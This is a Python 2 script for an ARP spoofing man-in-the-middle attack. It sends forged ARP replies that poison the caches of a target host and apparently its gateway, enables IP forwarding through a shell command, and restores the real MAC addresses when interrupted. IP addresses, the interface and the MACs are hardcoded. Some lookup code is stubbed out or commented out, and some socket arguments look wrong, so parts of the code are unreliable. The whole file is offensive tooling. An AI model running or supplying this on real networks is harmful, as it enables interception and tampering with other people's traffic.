import socket
import signal
import sys
import time
import os
from struct import pack
from uuid import getnode as get_mac
from ARP import ARP, parse_ip, parse_mac

class ARPSpoof:
	def __init__(self, target1, target2, interface):
		self.target1 = target1
		self.target2 = target2
		self.interface = interface
		self.my_mac = get_mac()
		self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
		self.sock.bind((self.interface, socket.SOCK_RAW))

	def request(self, ipsrc,ipdst,hwsrc, hwdest):
		arpreq = ARP(0x0001,self.my_mac, hwsrc, hwdest, ipsrc, ipdst).arp_packet
		self.sock.send(''.join(arpreq))

	def response(self, ipsrc,ipdst,hwsrc, hwdest):
		arpres = ARP(0x0002,self.my_mac, hwsrc, hwdest, ipsrc, ipdst).arp_packet
		self.sock.send(''.join(arpres))

	def arp(self, victim1_mac = None, victim2_mac = None):
		if victim1_mac is None:
			# to be implemented
			pass
		if victim2_mac is None:
			# to be implemented
			pass
		# victim1_mac = parse_mac(victim1_mac)
		# victim2_mac = parse_mac(victim2_mac)
		self.response(self.target1, self.target2, self.my_mac, victim2_mac)
		self.response(self.target2, self.target1, self.my_mac, victim1_mac)

	def rearp(self, victim1_mac = None, victim2_mac = None):
		if victim1_mac is None:
			# to be implemented
			pass
		if victim2_mac is None:
			# to be implemented
			pass
		# victim1_mac = parse_mac(victim1_mac)
		# victim2_mac = parse_mac(victim2_mac)
		self.response(self.target1, self.target2, victim1_mac, victim2_mac)
		self.response(self.target2, self.target1, victim2_mac, victim1_mac)

if __name__=="__main__":
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	arsp = ARPSpoof('172.25.12.87', '172.25.12.1', 'enp3s0')
	def signal_handler(signal, frame):
		c = 0
		while c<10:
			arsp.rearp(22371680195093 , 132879549407295)
			arsp.rearp(22371680195093 , 132879549407295)
			time.sleep(1)
			c+=1
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		arsp.sock.close()
		print "[*] Exiting!"
		sys.exit(0)
	signal.signal(signal.SIGINT, signal_handler)
	while True:
		arsp.arp(22371680195093 , 132879549407295)
		time.sleep(1)